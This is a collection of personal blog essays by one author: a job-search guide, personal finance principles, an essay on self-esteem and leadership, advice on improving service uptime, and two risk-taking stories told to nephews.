At first, I saw only one option: I would start a new company.

My end goal has always been to build a company with life-long friends
that takes a shot at a billion dollar problem. The time felt ripe. It
was November too, so I could take a short stint skiing and reading, then
back to SF to kick off the startup.

Yet, the more I spoke to close friends and mentors, the more I thought,
the more my eyes opened up to different options. I could go deeper at
FB, or I could join a new company, or I could do a sabbatical year,
or...you get the gist.

So what to do? I decided then that before I make a choice, I should get
the *best possible* options in front of me. How do we do that? by
kicking off that job search!

## The Advice

*Note: What follows is the most condensed form of advice I could write
on the job search, while keeping it fun and entertaining. I included
personal stories to illustrate points, and where it made sense I refer
out to sections in jobsearch.dev for more detail.*

## Day 0: Foundations

To kick off the search, there are a few mindset shifts that if done
well, can make everything else simple. In fact, I'll venture to say that
some of these mindset shifts when generalized can change your
perspective... on life itself!

Okay okay that's a serious statement, but give this a read, try it
yourself and let me know what you think after 😊.

### **Foundations I: Attitude**

Most people *dread* the job search. They think it's a kind of
performance, and *"they just want it to be over with".* This kind of
attitude can shoot you in the foot. If you dread something, you're less
likely to invest the time needed to get *great* at it. That can produce
negative experiences, which reinforces your opinion and causes a spiral
of bad outcomes. Plus, if you *"just want it be over with"* you're more
likely to choose the first few offers and miss out on the opportunity
that's *really* right for you.

Let's shift this. **Learn to love the job search *.*** You can look it
as an infrequent, leveraged opportunity for you to grow. This is your
chance to select *exactly* the right next move for your career. It's one
of the best times to negotiate your role and your compensation. Plus,
it's a great opportunity for you to expand and deepen your
relationships: you'll lean on your community throughout the search and
meet many talented people at some amazing companies.

Well, that's a lot of real good reasons to love the job search.
Internalize this attitude, and every step that follows turns into a
meaningful part of your life story.

### **Foundations II: Community**

Most people treat the job search as a solo activity. They apply for jobs
by themselves, they negotiate themselves, and they choose themselves. I
think this is because people associate asking for help with
*dependance,* and they're afraid to make themselves vulnerable.

Now, this is fine, it's an *independent mindset.* But we can go further.
Let's **shift to an interdependent mindset *.*** Think about it, teams
achieve great things, not individuals *.*

**Form a team around your search** and involve them in every phase **.**
Who are the mentors who can show you what you didn't know you didn't
know? Who are the peers that can train you and give you advice? Who are
friends who can refer you to the right companies? Engage them from the
start.

For example, as you saw in [**The
Decision**](https://m.stopa.io/10-offers-100-days-the-%20journey-16a0407b8d95#1c0b)
\*\* *,*\*\* before starting the search I met up with friends and
mentors to get their advice on what to do. I can honestly tell you that
these conversations opened paths I could never have *conceived* before.
**People who champion you can give you ambitious advice that you may be
afraid to see** , and that changes the game **.** A special shoutout to
my previous co-founder and life-long friend Sebastian Marshall, whose
strategic advice changed was invaluable to me at this stage.

When I did start the search, I created a document that tracked the
companies I was aiming for, alongside todos. This made it easy to share
where I was at with my community, and easy for my community to discover
ways they can help. Through this I received referrals at all 11
companies I aimed for.

When I began, two friends took the time to write up detailed advice from
their last job search. Many, many friends took the time to train me. One
of them was 12 timezones away and made time to skype for hours. They
showed me where the bar was at, and gave me the feedback I needed to
iterate.

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKnhtU2gweTl5RndmY3k4Q0sucG5nP3Jhdz10cnVl)

Had 1 day in New York, 3 life-long friends took the time to give me
personal training

Abraham Sorock, Alex Reichert, Andrew Wong, Daniel Woelfel, Giff Huang,
Jacky Wang, Kam Leung, Mark Shlick, Robert Honsby, Sean Grove special
shoutouts for the support and advice you gave me 😊. There's many more
--- if you're reading this and I haven't included you, it's mainly
because I thought you preferred privacy --- let me know and will update!

You're starting to get a sense *how* interdependent this was. If I
listed every person, I think it would surpass a hundred people. I truly
believe if you embrace this mindset and look at problems as a *team,*
you'll see a huge change in all you go for, not just the search.

### **Foundations III: Narrative**

We get to the final part of the mindset, *how you look at your career.*
Most people, if you ask them " *Why are you looking for a new job",*
will give you either a generic answer --- "I'm looking for a change *",*
"I want to be impactful", or some negative story *---* "I was bored *",
" *I didn't like X*". *This hurts you in at least three ways. First,
it's what everybody says, and it demonstrates that you haven't thought
deeply about your career. Second, it makes it hard for people to help*.
*If you tell your mentors "you're looking to be impactful", that doesn't
narrow much down, and They can't just open up their rolodex to email
every company they know. Third, it makes it impossible to be a *strong
fit* for any company. What can a recruiter note down if you say "you're
looking for a change", which will let them think you're a perfect fit
for their company? If you're looking for *any company,* then by
definition you can't be a *strong fit* for a specific company.

Instead, let's shift your viewpoint and take charge of your career.
**Look at your career as an adventure.** Sit down and reflect: What got
you here? What did you *love* about your last job? What would the most
*amazing* opportunity look like? As you go deeper, you'll discover
reasons that will get your thrilled, and show you how unique and awesome
your path has already been. It will make the search a lot more fun, it
will make it easier for people to help, and get recruiters *very*
excited about you. Most importantly, it will change how you think about
yourself and your career. Let me be clear, this isn't some trick to
change your viewpoint artificially. If you dig deep, you'll discover
*real,* true reasons, and that will reverberate throughout your life.

## Day 1 → 5: Kick Off

Okay, now we've learned to love the job search, we see it as a team
endeavor, and we have a strong conviction about our career. It's time to
kick off the search. To do that, let's do two things:

### **Kick Off I: Communication**

In every interview you do, people aim to extract *signal* and *scope*.
**Signal** is what *demonstrates* that you can do your job --- from
coding to designing systems. **Scope** is what demonstrates *the kinds
of problems you can take on ---* do you lead a team, a team of teams, or
the whole org?

The combination of signal and scope is what determines your level *.*
Your level, and where you fall on the spectrum is the most leveraged
decision for determining your compensation and the kinds expectations
you have.

Many people get annoyed about this. It feels very bureaucratic. Why
should some number define you? You may also know people who have "high
levels" but produce less. Thinking this way can hinder you. Another way
you can look at it is this: it's how things are for now, and it's the
best way we know so far to align your skills with the company. Let's
lean in and work with it.

Your goal for the first 5 days is to **form a conviction about your
level.** Go over expectations, and prove to yourself that you are the
level you are. If you want to do go deeper on this, visit our course and
see the "Communication" module --- it gives you a leveling guide to
calibrate. Once you've done this, update your resume and LinkedIn to
communicate that level. When you speak with recruiters and interviewers,
you should be able to freely communicate it as well. Finally, go to
levels.fyi, and form a conviction about the kind of compensation ranges
you're looking for too.

### **Kick Off II: Schedule Screens**

From consulting with your community and forming your narrative, you
should have about 10 or so companies that you could see yourself being
*thrilled* to work at *.* Now, engage your community and find a referral
for each company. You can do this by searching through your LinkedIn, or
sharing a document of your top choices with your community and asking
them if they know people who can refer. Do the best you can to go
through referrals, as having someone to champion you helps in many ways
throughout the process. If you can't find someone, it's okay to send a
direct application, but do that as a very last resort.

With all recruiters, ask to schedule a screen about 20--30 days in
advance. They may be surprised, but you can tell them you want to
prepare, and that will send positive signal too. With that, you'll have
a deadline, and a real good reason to start studying 😊.

## Day 5 → 30: Preparation

Now comes the hard work. It's time to ramp up for the technical
interviews.

### **Preparation I: Key Mindset**

The mindset at this stage I want to stress, is to *give it all you've
got.* Sometimes, as a way of coping with rejection, people give
themselves an out --- "Oh I didn't really study anyways". My suggestion
is to **frame your success on how hard you prepare,** not on the
results. Aim to remove *any reason to* say, you didn't try your absolute
best.

Fun story on that --- months before the search, I had trip planned with
one of my closest friends to go to Israel and Jordan, and it fell right
during preparation time...

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKjdzcU1PQXhXcFFWNVRpWXkucG5nP3Jhdz10cnVl)

Elements of Programming Interviews, 6am at a Bedouin camp

Well then, we need to travel and study at the same time 🙂. A special
shoutout for Jacky Wang for being such an awesome travel partner, and
being an encourager for the studies every day. Jacky's the kind of guy
who not only pushes the envelope to explore (just check out his
[photos](http://jackywang.org)), but he'll indulge and converse with
excitement about programming questions *for hours* on long car rides!

### **Preparation II: General Advice**

There are three pieces of advice that apply generally to all interview
types. First, the process to study: I recommend self-study first, then
schedule practice interviews, then try the real thing, then calibrate
and repeat the process if necessary. Second, **approach every interview
as if you are solving the problem for real *.*** Most people seem to
"pretend" when they solve the problem. They may not go deep enough,
write code that won't run, explain things for the sake of explaining, or
create a system that won't scale. *Imagine a team at work set up a
meeting and asked you to solve the problem,* and act accordingly. Third,
most people are blissfully unaware of what an *excellent performance*
looks like. They assume the interviewer will read their minds and see
how amazing they are. As you can guess, this won't work. Study each
interview type deeply, and get feedback on how you're doing from your
peers. Calibrate, make sure you are aware the bar, and you are well
above it.

*... **Now, for some more specific advice***

### **Preparation III: Algorithm Interviews**

Unless you're a specialist, this is the interview type to master first.
No matter how skilled and senior you are, algorithm interviews play a
significant role. I suggest you pick one book --- Joe and I prefer
[Elements of Programming
Interviews](https://www.amazon.com/Elements-Programming-Interviews-Python-%20Insiders/dp/1537713949/)
--- and work through it linearly every day (personal nit: skip the first
chapter in this book on bitwise operators, this is the most annoying
part of the book, and isn't needed for most interviews). If you get
stuck on a question, just look at the answer, but make sure to write it
with your own code, line by line. By the end of it, you'll be surprised
with all that you learn, and I guarantee you, at least if you go through
this book, you'll rarely be asked a question that you can't map to
something you've learned.

One common pitfall here is, people go on leetcode and do a bunch of
random questions. I suggest avoiding this --- since the questions are
random, you won't see improvement quickly, and you may not learn what's
needed. Leetcode is great though for finding and doing specific
questions.

A week or so after you're into the book, schedule practice interviews.
My favorites are <https://interviewing.io> and <https://pramp.com>. A
special shoutout to the founder of interviewing.io, Aline Lerner. There
was an obscure 19 year-old on hackernews who was having trouble coming
to the U.S. She took the time to help, and even gave him free access to
her lawyers. That 19 year- old was me, and I am still grateful 🙂.

The third or fourth week, schedule practice interviews with your friend
group. This is where you'll *really* get a sense of where you're at. If
the feedback is positive, you're ready for the screens. If not, *move
them. Y*ou'll be surprised how many times you can do that. We go quite
deep on this, and the kinds of questions you should be able to answer,
in the "Algorithm Interview" module of jobsearch.dev.

### **Preparation IV: UI Interviews**

For UI Engineers, I suggest three steps. First, get comfortable with
online editors, you'll be using them all the time, so you should be able
to set up an environment quickly. Second, ramp back up on some UI
concepts that you may not have worked on recently --- things like drag
and drop, selection apis, etc. If you're looking for more specific
inspiration, we've included some homework in the "UI Interview" module
of the course. Third, explore the latest and greatest in JS --- look up
what interests you --- from react hooks to all that's new in GraphQL. If
you're looking for some courses, [Wes Bos](https://wesbos.com) has some
great content to ramp you up. The key to these interviews is to
demonstrate your ability to build UIs and your love of UI engineering.
If you follow these steps it'll come through naturally.

### **Preparation V** : **System Design Interviews**

For System Design, I also suggest three steps. First, master the
*structure* --- scope down, go broad, outline a complete solution, go
deep on as many components as you can, then go the extra mile, to share
how you would actually launch the system. The "System Design" module in
the course does a great job of going deep on this. Next, as you go
through the practice interviews, you'll start to notice places where you
can improve. Start noting those down and build a plan to learn. For
example, if you don't know how to scale, you can search "{Company Name}
InfoQ" and find some awesome talks. If you're unsure about concurrency,
the book [7 concurrency models in 7
weeks](https://www.amazon.com/Seven-Concurrency-Models-Weeks-%20Programmers/dp/1937785653)
can ramp you up. Don't know much about databases? [7 databases in 7
weeks](https://www.amazon.com/Seven-Databases-Weeks-Modern-%20Movement/dp/1680502530).
Pick what interests you and start going deep. This is my favorite
interview type, because as you go deeper, the skills and knowledge you
learn transfers into making you a better architect.

### **Preparation VI: Experience Interviews**

The purpose of the Experience Interview is to understand your *scope
---* the kinds of problems you can solve --- and whether you are a
culture fit. This interview type largely takes care of itself if you've
centered on your narrative (you know what you want and where you're
going), and your communication (you know what level you are). The first
coneys your culture fit, and the second your scope. You can go deeper on
this in the "Experience Interview" module in the course.

### **Preparation VII: How to Focus for these 20 days**

Now you've got an outline of each kind of interview, and how to prepare.
For the first 20 days, I suggest focusing heavily on Algorithms. If
you're a UI engineer, still do algos, but spend maybe 30--40% of the
time building UI components too. You want to focus on this because the
screens are mainly this type of interview. As you pass the screens,
you'll have to go deeper on systems before you head into the onsites.

## Day 30 → 60: Execution

Okay, we're now ready to execute. Over the next month, you should be
finished with all your screens and on-sites.

### **Execution I: Key Pieces**

Three key pieces of advice here:

Come in to every interview with a positive mindset, and **treat everyone
with class**. These people could become your friends, and it's fun to
learn about how a company works. Come with that mindset, and the
confidence will seep through.

*Batch all the interviews.* **Make sure all the screens and onsites are
scheduled around the same time**. The preparation you can do part time,
but this piece Joe and I highly suggest, you figure out how to do
full-time. When offers land around the same time, you'll have a lot more
leverage.

**Communicate your level and your narrative** *.* Keep signal and scope
top of mind, and communicate clearly during every phase --- recruiter
screens, technical screens, and and onsites. We go deeper on this in the
"Interview Phases" module of the course.

### **Execution II: Dealing with the Unexpected**

As you go through the onsites, two things can happen:

**You'll fail at some interview**

As you may have noted, I did 11 onsites, and got 10 offers...that means
I failed one of em 😄. \_Even with some of the most intense prep, sh \*t
happens*. When it does, do not over-react, embarrass yourself by being
mean, or change your plans and cancel all upcoming interviews *.\_
Instead, treat everyone with a smile and with class. Then, be kind to
yourself, take out what lessons you can, and *continue on with the
plan*. If you see failure on more than one or two interviews, consider
re-scheduling and re-calibrating.

**You'll get something unexpected**

Life can throw curve ball at anytime, and you're unlikely to avoid it
during the job search. Case in point:

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKlFkb29WRGNCTEJDRGMtRGUucG5nP3Jhdz10cnVl)

Don't try huge jumps on your skis, when you don't know how, especially
during your job search

On Christmas break, Joe and I went skiing. I did an unintended backflip,
and landed in the ER. When something like this happens, again, avoid
over- reacting. Treat surprises as an opportunity to be malleable, and
make it part of your story. For example, the day I visited the ER, I had
a conversation with one of the best recruiters I've ever met, Twitter's
Matt Robbins. I sent him that picture, and I wager that will be the most
unique recruiter conversation either of us will have in our career.

## Day 60 → 100: Choice

Around Day 60, offers should start to roll in, and it's time to choose.
The first surprise that people may have here, is the number of days.
Most people take about a week or two to decide...Day 60--100 is 40 days!
Does it really take that long to choose a company, even after you've
received your offers?

Yes!

Let me be clear, this isn't about negotiation. You've already done 90%
of the legwork for that through your preparation and execution --- if
you communicated your level well, you've aced the interviews, and you
landed your offers around the same time, you can safely assume every
company will be competitive and get you the best offer. There are
specific things you can do at this point --- the main advice being to
use clear with what you would sign right away with. We go deeper on this
in the "Negotiation" section of the course. Patio11's [Salary
Negotiation](https://www.kalzumeus.com/2012/01/23/salary-negotiation/)
and Rands' [The
Business](http://randsinrepose.com/archives/the-business/) are great
reading too.

The reason this takes so long is because the purpose for this phase is
to ***choose the company that's the best fit for you.*** It's your turn
to interview back. Meet your team, meet your manager, really align on
the kinds of work you would do, and let your future team show you how
they could be a part of your narrative.

To give you context, Stripe, Airbnb, Square, and Google were my final
choices. I ended up meeting 6 managers at google, and visited Stripe,
Airbnb and Square offices at least 7 times each. By the end of these
meetings, you'll have formed friends, and have gotten a *great* sense of
what it's like to work at each company.

The final step before making the decision, is to get feedback from your
community. I suggest you **write out an essay that goes over your
decision,** and discuss with your peers and mentors --- do they agree
with your thinking, what do they see that you don't, do they have any
suggestions?

To get a sense of how this looks, here's a compressed screenshot of the
essay I sent my friends and mentors: "On Choosing"

![](https://stopa.io/api/image/aHR0cHM6Ly9naXRodWIuY29tL3N0b3BhY2hrYS9zdG9wYWJsb2cvYmxvYi9tYXN0ZXIvaW1nLzcwNC8wKm1NOGhKNmFBY1lIOW5WMzkucG5nP3Jhdz10cnVl)

Don't squint, it's not meant to be read

It's a bit too personal to share outright, but I wanted to give you a
sense of the kind of deliberation that went behind this: thousands of
words, and insights from more than a dozen of my closest friends and
mentors. These were amazing companies and the decision was close.

If you do this well, you'll have clear, strong conclusions for *exactly*
why you would choose a certain company. Compensation will be far away
from the main reasons, and you'll be thrilled to sign.

## Day 100: Breathe

This will be a day where you breathe and realize how exciting, yet how
tiring things were. Take a break and plan a celebration with your
community.

**With that, we've covered the advice 😊.**

## Final Notes

### An Ode to Joe Averbukh

I want to reveal something to you: any time I used the word "I" --- you
can replace it with "we". Joe is my roommate and lifelong brother. Joe
and I did this job search together, and we'll both be joining Airbnb, in
the same org to boot! We spoke every day, discussed every single
exchange and every single idea, and supported each-other through all the
highs and lows. Even writing this essay was Joe's idea, so if you got
something valuable from this, remember that at least half the credit
goes to him!

### Want to go deeper?

If you made it this far, and you're pumped, get ready to go deep into
the rabbit hole. Joe, Luba, and I, with the help of Aamir Patel and
Jordan Yagiello, expounded on all the lessons learned here, and created
a video course that will walk you through it all. From leveling guides,
to example narratives, to deep explanations on system design, UI
interviews, and more, you can get it there. **Best of all, it's 100%
free.** We were thinking of making it paid course initially, but after
some long talks, we wanted to share this with our community 😊. Go to
<https://jobsearch.dev> and see for yourself.

# My strategy for wealth and personal finance

*A few friends recently asked me for personal finance advice. I ended up
creating a list of principles, and thought I would share it with you
here.*

Before you get started, a few notes;

-   a\. These principles assume you want to create *a significant amount
    of wealth ( \> 15MM), at a relatively young age (\\\< 40 ).*

-   b\. I'm not a multi-millionaire yet, so this is all a work in
    progress too :}

-   c\. If you are just starting out your career, read
    [this](https://m.stopa.io/how-to-stack-the-doe-when-youre-an-intern-973635ff19bf)
    instead

Without further ado...let's get into it!

## Main Principles

**A) Wealth creation is non-linear**

Most people think you become rich linearly: by increasing a salary for
example. But, wealth is highly non-linear: 1 year nothing, 2nd year a
million

This means we need to think about creating wealth differently.

**B) To create wealth, you need to take high-upside, high-leverage bets
with people you respect**

Most people think the way to create wealth is with personal finance:
making investments, managing savings, etc.

But, unless you have a lot of money already, those are lower leverage.
The best bet is to learn high-leverage skills, then use them on
high-upside bets, with people you love. See [Naval's
tweet](https://twitter.com/naval/status/1002103360646823936) for the
best strategy about this.

*Does that mean that we should just spend all our money though, hoping
for the big pay day?*

No, because:

**C) To take high upside bets, you need money**

Money in the bank increases the chance you have of seeing and taking
these bets. For example, by having money in the bank:

-   You can make angel investments, or
-   invest in your friends, or
-   buy something that makes you much more productive, or
-   take time to work on a project that could turn into a company or
-   take your time negotiating your job offers or
-   outsource tasks to focus your creative energy

These all have high upsides, and can contribute to the step functions
that will help you reach your goal.

**This means that both the "entrepreneur, f ** it until I make 30MM" and
the "salary worker, just max the 401k" strategies are wrong.\*\*

Both of them are needed: because as you save, you start seeing more and
more opportunities. But,

**D) You need to be ready to spend to take those opportunities.**

Most people, when they start saving, start feeling guilty about
spending. This loses the leverage they have with their wealth. You
saved, *so* you could take big opportunities and live your dream life.

So, how do we save?

## Personal Finance Principles

**E) Willpower is valuable and rare**

Willpower is highly valuable, and we have very little of it. Most people
spend it worrying about what to spend. But they're in a losing game,
because

**F) People can't control their spending and saving with willpower**

If you feel guilty about what you spend, this will prevent you from
taking those big opportunities. But if you spend too much, you won't
have the chance to take them.

It's not worth spending willpower on figuring this out minute by minute.

Instead

**G) Build systems, so you can save the way you want, and spend the way
you want**

*Note: I learned this as a teenager, scouring the blog of the great
Ramit Sethi of iwt.com. There's gold there, check it out!*

Create goals for yourself. Whatever you want in your life: *don't tell
yourself no*

Want to take a long sabbatical? Create a sabbatical fund. Want to take
care of your mom and dad? Family fund. But how can you do those if you
want to start a company? Startup fund

Set up the systems you need to move towards this. The simplest thing to
create automatic transfers to those funds (more detail in *Tools)*

When you do this, ***you can save and spend with intent***. If you want
to ski, you want to start a startup, you want to live a rich life, *it's
all possible.*

Now, there's a tricky part here:

**H) As you make more money, lean into your system**

As you make more money, it's easy to ratchet up your lifestyle
thoughtlessly. This can be dangerous, because it can take away your
freedom to make big bets, which is the whole point of this.

To solve this, *lean into your system.* Increase your automatic
transfers, and you're good to go. Then, spend lavishly on *what you
value,* with the confidence that you are on your way to your goals.

Once you do this, soon you'll have a sizable amount saved up.

You'll enter the next tricky part: **losing all your money.** You may
think overspending is what will make you lose the money, but you'd be
wrong:

I **) People don't lose all their money spending, they lose all their
money by making bad investments**

*Note: I learned this lesson from one of Paul Graham's essays. I've read
them all many times, I highly recommend you do too*

It's not easy to spend a lot of money. But it's easy to invest a lot of
money, and have that disappear.

This is why it's important for you to

**J) Store the majority of your personal finance in highly-safe
investments**

This wealth is meant for you to take those big chances, so they should
be available. Don't go for the "10%" return options thing, which could
end up wiping you out. Instead, buy index funds, buy bonds, buy
property, gold --- things that don't disappear into thin air.

Now, you may ask: *"what about the angel investing, crazy opps that
require money?"*

Create a fund for that. The majority should be in safe investments, so
if in the rare case you *really really* need to make that investment, or
take that startup opportunity, you can.

## Tools

As one more mentor, Nassim Taleb says --- nothing without skin in the
game. *What do I actually do, tactically?*

**Overview**

I use **Personal Capital** , to keep an overview of my net worth, and
how all the investments have been doing. I check this rarely --- like
once a month

Even more rarely (like once a year) I use **Google Sheets** , to
manually go over investments. The goal is to make sure that I am
invested in the things I value, and the allocations are right.

**Banking**

All payments initially land in **Schwab Checking**. Some amount goes to
**Fidelity** to max the 401k.

Every 2 weeks, automatic transfers leave Schwab and get sent to
**Betterment**. These go into conservative index fund combo accounts
\~(70% stock, 30% bond). Some examples: Safety Net, Startup, Investment
Opp, Parent Dreams, Real Estate, Extended Travel.

I also use **Schwab Brokerage** , and have a few specific investments
(gold index fund, commodity index fund, AAPL, TSLA)

**Allocation**

*Here's my general allocation:*

-   small amounts of: angel investing, to take high-upside bets
-   small amounts of: gold, commodities, to offset some worries i had
    about the market
-   small amounts of: AAPL, TSLA --- bought them on dips, and believe in
    the companies long term
-   bit bigger amount of: Georgian Property. I want to stay connected to
    Georgia and fam there
-   majority in: 70/30% index fund accounts with names on em. These are
    highly-available assets, with the purpose of using them for startup
    / opp if ever needed

## Summary

And with that, we reach the end. If you get only 3 things from this, I
hope they'd be:

1.  Money gets made by taking high-upside bets

2.  To do that, you need to have *some money,* which means you need to
    be good at personal finance

3.  To be good at personal finance, you need to build a system, which
    lets you *save,* and just as importantly, *spend, on taking big bets
    and living your rich life*

*Special thanks to Jacky Wang, Joe Averbukh, Lin Wang, Alex Reichert,
Giff Huang, Luke Shackelford for reviewing this*

# On leadership, self-esteem, and confidence

Joe and I have a bit of a reputation. We're known to have a high level
of self-esteem --- so much so that we've been asked " *how do we do
it?"* quite a few times.

In this essay, I'll try to answer how I think about it:

**A. Your goal is to convince yourself that you are a confident leader
with high self-esteem**

Your inner critic knows you best, and they're the hardest to convince.
Yet they are the most important person that we need to convince: all our
behaviors and beliefs stem from there.

Now, you could try to convince your critic by describing yourself as a
confident leader with high self esteem: "Oh I'm confident, oh I'm a
leader"

But your critic is too smart for that. If you try this the words will
seem hollow. After all your inner critic knows what you *really* think.

To truly convince our inner critic we'll have to get more concrete:
*what do these words actually mean?*

To convince your critic, first

**B. Identify the *behaviors* behind self-esteem, confidence, and
leadership**

Take a step back and ask yourself: *what do these words mean to you?*

**Self-esteem:** *To me, self-esteem means you have strong core values,
which you won't change to appease other people. You are okay with who
you are. You are capable of being vulnerable and risking rejection,
because you value your self-opinion higher than those of the crowd.*

**Confidence:** *To me, confidence means, you go after ambitious goals
because you believe you are capable of achieving them.*

**Leadership:** *To me, leadership comes from taking care of other
people, empowering other people, thinking of others before yourself,
doing the hard work, inspiring others.*

**Now you can start to describe yourself with these behaviors**

Instead of I have high self esteem, you can say

-   *I have strong core values*

-   *I stand up for what's right.*

Instead of I'm a leader, you can say:

-   *I am a person who looks out and takes care of people.*

-   *I am a person who coaches and empowers people.*

At this point your inner critic will start to listen...but we'll need to
do more before it catches on. To truly cement those beliefs:

**C. Prove out behaviors with your actions**

As life goes on, you'll come across *many* opportunities to help others,
to stand up for what's right, to dig the ditches and do the hard work.

To illustrate how frequent these opportunities are, let's think about
something very simple. Say you want to meet your friends

-   Instead of waiting for people to invite you, take initiative and
    invite others
-   When you're choosing where to eat, instead of asking yourself *where
    you specifically want to eat,* ask yourself, *where your friends
    would enjoy eating the most*
-   When you're about to order, instead of thinking about what you want
    to eat first, think, would the group like some appetizers or drinks?
-   Now say you arrive, and you notice one of your friends drops a fork:
    take the initiative and pick it up, ask the waiter to help
-   Say you've been at this restaurant a few times, introduce yourself
    to the staff, and thank them for taking care
-   Say at the dinner there's a pretty person you're interested in, but
    they say something you disagree with. Stay strong and say what you
    think (I still struggle with this one :P)

These opportunities are *everywhere.* Notice them, pick them up, and all
of a sudden, your description of yourself gains strength. With that you
can begin to make the jump and tell yourself "I'm confident". This time
the words have depth.

**The best part of all of this is that your internal critic will change
roles: from *critic* to *advocate*.** Initially, all they did was hold
you back. But, as you train them to describe you with positive and
worthwhile behaviors, the tone will shift: when something bad happens,
they'll start giving you reasons why everything will be okay, why you
have the strength to deal with this, why you will behave with class.

This will reverberate throughout your life.

**End Notes**

**1)** One thing that helps: *role models for these behaviors.*

Personally, adventure novels (Scaramouche, Captain Blood) and anime
(Naruto, One Piece) left an imprint on me. I often think about what some
of my favorite characters would do in certain situations 😄.

**2)** One thing to watch out for: *ego*

It's easy to take this thinking too far and begin to think you are
*special, an exception.* You don't have *actually* pay the price, you're
born this way. This is a recipe for disaster and it is very easy to fall
into, especially when you receive praise from others.

What helps me:

-   Remember that we are all one, a part of a community. It's weird to
    say this, but in case you don't already believe it: All human life
    is worth the same, no matter what we do.
-   Tie your self belief to your actions: it's easy to *stop* being a
    leader: all you have to do is let it get to your head and stop
    caring for other people.

**3)** This may generalize

Thinking about it, this generalizes to a whole bunch of other
characteristics. How do you become a great communicator, or how do you
become a great writer, an exceptional engineer? The steps seem the same.
Something to think about!

**Prior Art**

-   James Clear talks a lot about the effect describing yourself can
    have in his book *Atomic Habits.* Highly recommend reading

-   My previous co-founder Sebastian Marshall would always tell me:
    judge yourself by your actions. This definitely played a part in my
    philosophy

And with that, we have a rough roadmap for leadership, self-confidence,
and self-esteem 🙂

*Thanks to Alex Reichert, Giff Huang, Joe Averbukh, Luba Yudasina for
the review*

# How to get those 9s: on improving service uptime

What do you do when you inherit, or just as commonly, create, a service
with low reliability?

*Improving reliability can be daunting*. You have low visibility into
the system, and sometimes, if you inherited it, low expertise. The
system is ever- changing, so if you just metric on success rate, you'll
consistently come across new errors, as soon as you fix old ones.

*But...with the right strategy, improving reliability can be fun...
maybe even thrilling!* You'll get to dive deep and solve some hairy
problems. You'll create solutions that not only improve your
service...but improve all services in your company.

Now, to do this, I've come down to a strategy of three steps:

1.  **Stop the bleeding** : *Represent the service as it is and hold the
    fort*
2.  **Bring Observability:** *Identify the root causes weekly*
3.  **Incrementally Improve:** *Retro and improve based on the most
    important root causes*

## 1. Stop the bleeding: Represent the service as it is and hold the fort

This service is often already goal on uptime: maybe with that 99.99.

Most likely though, the service is failing that so consistently, that
the goal no longer has any signal.

Our goal here: *bring back the signal*. To do this,

**Action Item 1: Update the uptime goal to represent the current state
of the system**

Update the uptime, so that this metric to represent the current P99
uptime and latency values. If you do this, the goal should start to go
green. This will help you become intentional about uptime slips moving
forward.

This brings you back that signal. Now, just because it's green, doesn't
mean . that you stop here and go on with our day. The next step is to
improve it. To do that we need to

## 2. Bring Observability: Identify the root causes weekly

To have a meaningful approach to improving uptime, we'll need visibility
into your system.

Visibility in this case means the answer this question:

**Question 1: What were the root causes of incidents last week?**

The key here is *root cause.* You want to know: each week, what where
the actual errors that brought down the system.

**Action Item 2: Answer "what were the root cause incidents last
week?"**

You'll need to invest in your tooling, to create a list of the big bugs
that brought the system down.

Sometimes, especially in distributed systems, it can be very hard to get
a sense of the *root cause --- a* root cause could be a leaf node
service error, and your infrastructure may not be aggregating by leaf
nodes.

Nevertheless, it's possible. You can look into observability tooling ---
the most promising one I know right now is
[www.honeycomb.io](http://www.honeycomb.io) (no affiliation) --- but
more likely then not, you can use your existing tooling and an hour of
manual work / scripting, to get a good sense.

Once you know that answer, you can

## 3. Improve Incrementally: Retro and improve based on the most important

root causes

As you get this information, you can begin to run a "mini incident
management" series:

**Action Item 3: Create a "retro" series for fixing root causes**

For the biggest error, take the steps needed to *fix and remediate the
root cause.* This includes fixing the bug, as well as adding a test or
an alert, or turning a hard dependency into a soft dependency.

If you do this consistently enough, you should begin to see our uptime
improve. You can goal yourself on the top-line metric (uptime
reduction), but also the number of root cause errors removed,
remediations added (tests, process changes, etc), etc.

I read once in Nasism Taleb's books: one plane crash, makes all planes
safer. This is because the aviation agency investigates the plane crash,
and makes sure that kind of error doesn't happen again. This applies to
your service too. When you do these retoes, you all of a sudden make
your service better and better and better. It becomes... *antifragile!*

\*\* *Summary of Action Items*\*\*

1.  Update your uptime to represent the current state of the system

2.  Answer *"what were the root cause incidents last week?"*

3.  Create a "retro" series for fixing root causes

# Two stories I share with my nephews, to help them take risks and follow their curiosity

**Story 1: The Dice**

I ask them:

*Imagine there's a game of dice. If you roll any number but 5, you give
me one dollar. But, if you roll a 5, I'll give you 600 dollars.*

*Would you play the game?*

**They invariably say yes.**

(Some say, "depends on how much money I have", which case I pat them on
back, as they discovered expected utility. I then tell them though they
have a hundred bucks at hand, and they say yes again : ))

Now I tell them:

*Imagine someone walked by you and saw you play the game.*

Most of the time, other people will see you lose. They'll think you're
dumb.

Here they get heated, and say --- heck, that person doesn't know how big
I'll win! I agree, and then ask them:

*Imagine now, it'a a 60-sided die. You still lose a dollar each time,
but if you get a 5, you win 6 million.*

They get excited by the millions, and say they'll take it. Yet, I remind
them, *now if someone sees you, they'll almost **always** think you're
dumb.*

And from there, we get to the lesson:

**It's important to try for things, even if you have a small chance of
winning**. *So...apply for that scholarship, try out for that team. Yes,
maybe you'll lose, and heck, you're likely to lose, but that's the whole
point.*

------------------------------------------------------------------------

**Story 2: The track captain and the climate change speaker**

*Note: I discovered this story as a kid myself from one of Cal Newport's
blog posts. I can't find it, so will reproduce here. Highly
suggest[checking out his blog](https://www.calnewport.com)!*

I start with:

*Imagine two stories:*

A. One person is the captain of their high school track and field team.

B. One person gave a speech on climate change at the United Nations.

*Who is more impressive?*

**They invariably say B: climate change.**

(If I tell this to Eastern European parents, they say A. track captain,
because they think the UN person got in through insider connections. I
tell them to ignore this though, and imagine it was earned :P)

*I then ask: why?*

After some minutes, I explain:

\*\* *With track captain: you can *imagine\_ how they did it*\*\* *.\_

If someone wakes up every day at 6am and works very very hard, they can
become the track captain.

But with climate change it's hard to imagine --- *how the heck* did they
get there?

